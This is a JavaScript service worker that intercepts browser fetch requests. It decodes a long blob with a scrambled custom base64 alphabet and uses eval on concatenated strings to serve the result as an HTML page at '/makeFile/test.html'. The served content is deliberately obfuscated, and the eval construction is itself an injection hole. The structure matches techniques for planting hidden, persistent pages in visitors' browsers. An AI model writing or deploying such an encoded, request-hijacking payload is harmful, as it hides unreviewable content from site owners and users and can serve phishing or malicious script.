self.addEventListener('fetch', (event) => {
function decodeStr(input) {
  const chars = 'MZAPLQXKOSWNCDJIEBVFHRUGYTzmxncbvlaksjdhfgqpwoeiruty5049382716/+';
  let output = '';
  let i = 0;

  input = input.replace(/[^A-Za-z0-9\+\/\=]/g, '');

  while (i < input.length) {
    const index1 = chars.indexOf(input.charAt(i++));
    const index2 = chars.indexOf(input.charAt(i++));
    const index3 = chars.indexOf(input.charAt(i++));
    const index4 = chars.indexOf(input.charAt(i++));
    const a = (index1 << 2) | (index2 >> 4);
    const b = ((index2 & 15) << 4) | (index3 >> 2);
    const c = ((index3 & 3) << 6) | index4;

    output += String.fromCharCode(a);
    if (index3 !== 64) output += String.fromCharCode(b);
    if (index4 !== 64) output += String.fromCharCode(c);
  }

  return output;
}
function encodeStr(input) {
  const chars = 'MZAPLQXKOSWNCDJIEBVFHRUGYTzmxncbvlaksjdhfgqpwoeiruty5049382716/+';
  let output = '';
  let i = 0;

  while (i < input.length) {
    const a = input.charCodeAt(i++);
    const b = input.charCodeAt(i++);
    const c = input.charCodeAt(i++);
    const index1 = a >> 2;
    const index2 = ((a & 3) << 4) | (b >> 4);
    const index3 = isNaN(b) ? 64 : ((b & 15) << 2) | (c >> 6);
    const index4 = isNaN(c) ? 64 : c & 63;

    output += chars.charAt(index1) + chars.charAt(index2) + chars.charAt(index3) + chars.charAt(index4);
  }

  return output;
}
  const url = new URL(event.request.url);
  
function makeFile(name, contenttype, content){
  eval(`
  if (url.pathname === '` + name + `') {
    event.respondWith(
      fetch('.')
        .then(response => {
            return new Response(decodeStr('` + content + `'), {
              status: 200,
              headers: { 'Content-Type': '` + contenttype + `' }
            });
        })
    );
  }
  `);
}
  makeFile("/makeFile/test.html", "text/html", "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");
});
